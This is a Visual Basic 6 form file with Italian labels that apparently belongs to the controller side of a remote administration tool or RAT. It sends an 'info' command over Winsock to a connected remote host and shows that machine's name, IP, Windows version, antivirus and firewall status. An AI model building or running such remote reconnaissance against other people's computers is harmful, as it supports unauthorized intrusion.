VERSION 5.00
Begin VB.Form Form21 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Info Del Pc:"
   ClientHeight    =   4425
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   5955
   LinkTopic       =   "Form21"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4425
   ScaleWidth      =   5955
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text8 
      Height          =   285
      Left            =   1680
      TabIndex        =   8
      Top             =   720
      Width           =   4095
   End
   Begin VB.TextBox Text7 
      Height          =   285
      Left            =   1680
      TabIndex        =   7
      Top             =   2160
      Width           =   4095
   End
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   1680
      TabIndex        =   6
      Top             =   2640
      Width           =   4095
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   1680
      TabIndex        =   5
      Top             =   240
      Width           =   4095
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   1680
      TabIndex        =   4
      Top             =   1680
      Width           =   4095
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   1680
      TabIndex        =   3
      Top             =   1200
      Width           =   4095
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1680
      TabIndex        =   2
      Top             =   3600
      Width           =   4095
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Ricevi Info Remote"
      Height          =   255
      Left            =   1800
      TabIndex        =   1
      Top             =   4080
      Width           =   2175
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1680
      TabIndex        =   0
      Top             =   3120
      Width           =   4095
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      Caption         =   "Versione"
      Height          =   195
      Left            =   360
      TabIndex        =   16
      Top             =   1730
      Width           =   615
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      Caption         =   "Build"
      Height          =   195
      Left            =   480
      TabIndex        =   15
      Top             =   1245
      Width           =   345
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      Caption         =   "Tipo"
      Height          =   195
      Left            =   480
      TabIndex        =   14
      Top             =   3200
      Width           =   315
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      Caption         =   "AntiVirus"
      Height          =   195
      Left            =   360
      TabIndex        =   13
      Top             =   2200
      Width           =   615
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      Caption         =   "Firewall"
      Height          =   195
      Left            =   360
      TabIndex        =   12
      Top             =   2700
      Width           =   525
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "Windows"
      Height          =   195
      Left            =   360
      TabIndex        =   11
      Top             =   3650
      Width           =   660
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Ip Locale"
      Height          =   195
      Left            =   240
      TabIndex        =   10
      Top             =   750
      Width           =   660
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Nome Computer"
      Height          =   195
      Left            =   240
      TabIndex        =   9
      Top             =   270
      Width           =   1140
   End
End
Attribute VB_Name = "Form21"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Text1.Text = ""
Text2.Text = ""
Text3.Text = ""
Text4.Text = ""
Text5.Text = ""
Text6.Text = ""
Text8.Text = ""
Text7.Text = ""
DoEvents
Form1.Winsock1(Form1.Label14.Caption).SendData "info"
End Sub

Private Sub Form_Load()
Me.Caption = Form1.Winsock1(Form1.Label14.Caption).RemoteHostIP


End Sub
